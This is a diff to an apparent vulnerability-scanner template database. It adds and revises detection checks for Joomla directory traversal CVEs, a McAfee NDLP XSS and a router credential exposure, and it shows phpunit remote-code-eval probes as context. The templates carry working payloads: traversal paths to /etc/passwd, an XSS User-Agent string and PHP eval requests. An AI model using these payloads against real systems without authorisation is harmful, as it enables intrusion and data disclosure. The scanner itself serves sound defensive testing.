@@ -830,6 +830,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1533",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the TweetLA (com_tweetla) component 1.0.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component TweetLA 1.0.1 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12142",
+          "https://www.cvedetails.com/cve/CVE-2010-1533"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_tweetla&controller=../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1602",
       "info": {
         "author": "daffainfo",
@@ -1131,6 +1168,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_perchacategoriestree&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2036",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Percha Fields Attach (com_perchafieldsattach) component 1.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Percha Fields Attach 1.0 - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/34004\n- https://www.cvedetails.com/cve/CVE-2010-2036\n",
+        "severity": "high",
+        "tags": "cve,cve2010,lfi,joomla"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_perchafieldsattach&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -6745,6 +6816,49 @@
       ]
     },
     {
+      "id": "CVE-2017-4011",
+      "info": {
+        "author": "geeknik",
+        "description": "McAfee Network Data Loss Prevention (NDLP) 9.3.x allows remote attackers to get session/cookie information via modification of the HTTP request.",
+        "name": "McAfee NDLP User-Agent XSS",
+        "reference": [
+          "https://medium.com/@david.valles/cve-2017-4011-reflected-xss-found-in-mcafee-network-data-loss-prevention-ndlp-9-3-x-cf20451870ab",
+          "https://kc.mcafee.com/corporate/index?page=content&id=SB10198",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-4011"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2017,mcafee,xss"
+      },
+      "requests": [
+        {
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "var ua='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-5487",
       "info": {
         "author": "Manas_Harsh,daffainfo,geeknik",
@@ -7353,49 +7467,6 @@
             "GET /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n",
             "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n",
             "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\nConnection: close\nContent-Length: 17\nAccept: */*\nAccept-Language: en\nContent-Type: text/html\nAccept-Encoding: gzip, deflate\n\n<?php echo md5(phpunit_rce);?>\n"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "CVE-2017–4011",
-      "info": {
-        "author": "geeknik",
-        "description": "McAfee Network Data Loss Prevention (NDLP) 9.3.x allows remote attackers to get session/cookie information via modification of the HTTP request.",
-        "name": "McAfee NDLP User-Agent XSS",
-        "reference": [
-          "https://medium.com/@david.valles/cve-2017-4011-reflected-xss-found-in-mcafee-network-data-loss-prevention-ndlp-9-3-x-cf20451870ab",
-          "https://kc.mcafee.com/corporate/index?page=content&id=SB10198",
-          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-4011"
-        ],
-        "severity": "medium",
-        "tags": "cve,cve2017,mcafee,xss"
-      },
-      "requests": [
-        {
-          "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//"
-          },
-          "matchers": [
-            {
-              "part": "body",
-              "type": "word",
-              "words": [
-                "var ua='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//"
-              ]
-            },
-            {
-              "part": "header",
-              "type": "word",
-              "words": [
-                "text/html"
-              ]
-            }
-          ],
-          "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}"
           ]
         }
       ]
@@ -11580,7 +11651,7 @@
         "name": "ifw8 Router ROM v4.31 allows credential disclosure",
         "reference": "- https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md\n- https://nvd.nist.gov/vuln/detail/CVE-2019-16313\n",
         "severity": "high",
-        "tags": "cve,cve2019,lfi"
+        "tags": "cve,cve2019,exposure,router,iot"
       },
       "requests": [
         {
@@ -11596,13 +11667,11 @@
           ],
           "matchers": [
             {
-              "condition": "and",
               "part": "body",
-              "type": "word",
-              "words": [
-                "user",
-                "pwd"
-              ]
+              "regex": [
+                "<td class=\"pwd\" data=\"([a-z]+)\">\\*\\*\\*\\*\\*\\*<\\/td>"
+              ],
+              "type": "regex"
             },
             {
               "status": [
